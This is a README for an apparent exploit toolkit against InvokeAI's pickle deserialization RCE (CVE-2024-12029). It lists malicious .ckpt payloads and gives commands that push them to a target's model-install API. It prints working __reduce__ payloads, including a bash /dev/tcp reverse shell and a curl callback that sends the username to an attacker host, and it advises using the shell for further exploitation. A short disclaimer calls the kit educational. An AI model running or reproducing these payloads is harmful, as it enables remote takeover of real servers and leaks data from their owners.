# Alternative-Approach-Reverse-Shell-Callback-Test-InvokeAI-RCE

# Alternative Approach: Reverse Shell & Callback Test

## Overview

This repository contains alternative payload approaches for the InvokeAI RCE vulnerability (CVE-2024-12029) when SSH key injection fails. The payloads are designed to test if pickle deserialization is actually occurring and provide alternative access methods.

## Problem Statement

When SSH key injection payloads are delivered successfully (Status 201) but SSH access still requires password, it indicates either:
1. Pickle deserialization is not happening
2. Commands are being blocked/sandboxed
3. Execution method is incompatible

## Solution: Alternative Payloads

### 📁 Payload Files

#### **Reverse Shell Payloads**
- `payload_reverse_bash.ckpt` (89 bytes) - Bash reverse shell
- `payload_reverse_python.ckpt` (267 bytes) - Python reverse shell  
- `payload_reverse_nc.ckpt` (70 bytes) - Netcat reverse shell

#### **Test & Verification Payloads**
- `payload_callback_test.ckpt` (115 bytes) - HTTP callback to verify deserialization
- `payload_test.ckpt` (90 bytes) - Simple file creation test
- `payload_alt_exec.ckpt` (223 bytes) - Alternative execution method

#### **SSH Payloads (for reference)**
- `payload_ssh_simple.ckpt` (271 bytes) - Linux-compatible SSH key injection

### 🛠️ Test Scripts

#### **Kali Test Scripts**
- `kali_reverse_test.py` - Comprehensive test suite


#### **Payload Generators**
- `reverse_shell_payload.py` - Generate reverse shell payloads

## 🚀 Quick Usage

### 1. Start Payload Server
```bash
python web_server.py --port 8000
```

### 2. Test Callback (Recommended First)
```bash
# Copy kali_reverse_test.py to Kali and run:
python3 kali_reverse_test.py
# Choose option 1 to test callback
```

### 3. Test Reverse Shell
```bash
# Start listener on Kali:
nc -lvnp 4444

# Send reverse shell payload:
python3 -c "import requests; requests.post('http://192.168.117.218:9090/api/v2/models/install', params={'source': 'http://192.168.45.168:8000/payload_reverse_bash.ckpt', 'inplace': 'true'}, json={})"
```

### 4. Test Simple Execution
```bash
# Test basic command execution:
python3 -c "import requests; requests.post('http://192.168.117.218:9090/api/v2/models/install', params={'source': 'http://192.168.45.168:8000/payload_test.ckpt', 'inplace': 'true'}, json={})"

# Verify file creation:
ssh root@192.168.117.218 'cat /tmp/payload_test.txt'
```

## 📊 Test Results Interpretation

### ✅ **Callback Test Success**
- **What it means**: Pickle deserialization is working
- **Next step**: Try reverse shell or alternative SSH payloads
- **Check**: Web server logs for HTTP callback

### ✅ **Reverse Shell Success**  
- **What it means**: Commands execute and network access works
- **Result**: Direct shell access via netcat listener
- **Next step**: Use reverse shell for further exploitation

### ✅ **Test File Created**
- **What it means**: Basic command execution works
- **Next step**: Try alternative SSH injection methods
- **Check**: `/tmp/payload_test.txt` on target


### **Callback Payload**
```python
class CallbackTestPayload:
    def __reduce__(self):
        import os
        command = 'curl "http://192.168.45.168:8000/callback?success=1&user=$(whoami)"'
        return (os.system, (command,))
```

### **Reverse Shell Payload**
```python
class ReverseShellPayload:
    def __reduce__(self):
        import os
        command = f'bash -c "bash -i >& /dev/tcp/192.168.45.168/4444 0>&1"'
        return (os.system, (command,))
```

### **Test Payload**
```python
class TestPayload:
    def __reduce__(self):
        import os
        return (os.system, ('echo "PAYLOAD_EXECUTED_$(date)" > /tmp/payload_test.txt',))
```

## 📚 References

- **CVE-2024-12029**: InvokeAI Remote Code Execution
- **PyTorch Unsafe Deserialization**: `torch.load()` vulnerability
- **Pickle __reduce__**: Python object serialization exploitation


## ⚠️ Disclaimer

This repository is for educational and authorized security testing purposes only. Users are responsible for ensuring they have proper authorization before testing any systems.
